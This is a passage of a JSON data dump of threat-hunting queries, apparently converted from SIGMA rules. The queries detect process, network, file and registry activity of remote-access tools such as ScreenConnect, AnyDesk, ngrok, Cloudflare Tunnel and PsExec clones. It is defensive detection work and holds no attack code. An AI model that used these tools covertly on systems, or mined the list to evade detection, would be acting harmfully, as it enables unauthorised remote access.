            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 35
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of ScreenConnect RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential ScreenConnect RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"C:\\Program Files (x86)\\ScreenConnect Client (Random)\\ScreenConnect.ClientService.exe\" or src.process.image.path contains \"Remote Workforce Client.exe\" or src.process.image.path contains \"\\*\\ScreenConnect.ClientService.exe\" or src.process.image.path contains \"\\*\\ScreenConnect.WindowsClient.exe\" or src.process.image.path=\"*screenconnect*.exe\" or src.process.image.path contains \"screenconnect.windowsclient.exe\" or src.process.image.path contains \"Remote Workforce Client.exe\" or src.process.image.path=\"*screenconnect*.exe\" or src.process.image.path=\"*ConnectWiseControl*.exe\" or src.process.image.path=\"*connectwise*.exe\" or src.process.image.path contains \"screenconnect.windowsclient.exe\" or src.process.image.path contains \"screenconnect.clientservice.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 36
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of Quick Assist RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Quick Assist RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"quickassist.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 37
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of AeroAdmin RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential AeroAdmin RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"aeroadmin.exe\" or src.process.image.path contains \"AeroAdmin.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 38
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of mRemoteNG RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential mRemoteNG RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"user_managed\" or url.address contains \"mremoteng.org\") or (event.dns.request contains \"user_managed\" or event.dns.request contains \"mremoteng.org\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 39
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of PuTTY Tray RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential PuTTY Tray RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"C:\\*\\puttytray.exe\" or src.process.image.path contains \"\\puttytray.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 40
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of 247ithelp.com (ConnectWise) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential 247ithelp.com (ConnectWise) RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \".247ithelp.com\" or event.dns.request contains \".247ithelp.com\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 41
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of CloudFlare Tunnel RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential CloudFlare Tunnel RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"cloudflared.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 42
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of CloudFlare Tunnel RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential CloudFlare Tunnel RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \"cloudflare.com/products/tunnel/\" or event.dns.request contains \"cloudflare.com/products/tunnel/\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 43
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of NoMachine RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential NoMachine RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"user_managed\" or url.address contains \"nomachine.com\") or (event.dns.request contains \"user_managed\" or event.dns.request contains \"nomachine.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 44
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of ScreenConnect RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential ScreenConnect RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"control.connectwise.com\" or url.address contains \".connectwise.com\" or url.address contains \".screenconnect.com\") or (event.dns.request contains \"control.connectwise.com\" or event.dns.request contains \".connectwise.com\" or event.dns.request contains \".screenconnect.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 45
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of UltraViewer RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential UltraViewer RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \" .ultraviewer.net\" or url.address contains \"ultraviewer.net\") or (event.dns.request contains \" .ultraviewer.net\" or event.dns.request contains \"ultraviewer.net\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 46
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of PSEXEC (Clone) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential PSEXEC (Clone) RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"paexec.exe\" or src.process.image.path=\"*PAExec-*.exe\" or src.process.image.path contains \"remcom.exe\" or src.process.image.path contains \"remcomsvc.exe\" or src.process.image.path contains \"xcmd.exe\" or src.process.image.path contains \"xcmdsvc.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 47
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of PSEXEC (Clone) RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential PSEXEC (Clone) RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and (url.address contains \"user_managed\" or event.dns.request contains \"user_managed\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 48
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential processes activity of ngrok RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential ngrok RMM Tool Process Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"ngrok.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 49
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Splashtop Remote RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Splashtop Remote RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"splashtop.com\" or url.address contains \".api.splashtop.com\" or url.address contains \".relay.splashtop.com\" or url.address contains \".api.splashtop.eu\") or (event.dns.request contains \"splashtop.com\" or event.dns.request contains \".api.splashtop.com\" or event.dns.request contains \".relay.splashtop.com\" or event.dns.request contains \".api.splashtop.eu\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 50
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential files activity of ScreenConnect RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential ScreenConnect RMM Tool File Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"file\" and (endpoint.os=\"windows\" and (tgt.file.path=\"*C:\\Program Files*\\ScreenConnect\\App_Data\\Session.db\" or tgt.file.path=\"*C:\\Program Files*\\ScreenConnect\\App_Data\\User.xml\" or tgt.file.path=\"*C:\\ProgramData\\ScreenConnect Client*\\user.config\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 51
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential registry activity of AnyDesk RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential AnyDesk RMM Tool Registry Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.category=\"Registry\" and (endpoint.os=\"windows\" and (registry.keyPath contains \"HKLM\\SOFTWARE\\Clients\\Media\\AnyDesk\" or registry.keyPath contains \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AnyDesk\" or registry.keyPath contains \"HKLM\\SOFTWARE\\Classes\\.anydesk\\shell\\open\\command\" or registry.keyPath contains \"HKLM\\SOFTWARE\\Classes\\AnyDesk\\shell\\open\\command\" or registry.keyPath contains \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Print\\Printers\\AnyDesk Printer\\*\" or registry.keyPath contains \"HKLM\\DRIVERS\\DriverDatabase\\DeviceIds\\USBPRINT\\AnyDesk\" or registry.keyPath contains \"HKLM\\DRIVERS\\DriverDatabase\\DeviceIds\\WSDPRINT\\AnyDesk\" or registry.keyPath contains \"HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\AnyDesk\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 52
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Chrome Remote Desktop RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Chrome Remote Desktop RMM Tool Network Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "(event.category in (\"DNS\",\"Url\",\"IP\")) and (endpoint.os=\"windows\" and ((url.address contains \"remotedesktop-pa.googleapis.com\" or url.address contains \"remotedesktop.google.com\" or url.address contains \"remotedesktop.google.com\") or (event.dns.request contains \"remotedesktop-pa.googleapis.com\" or event.dns.request contains \"remotedesktop.google.com\" or event.dns.request contains \"remotedesktop.google.com\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 53
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects potential network activity of Supremo RMM tool",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Potential Supremo RMM Tool Network Activity",
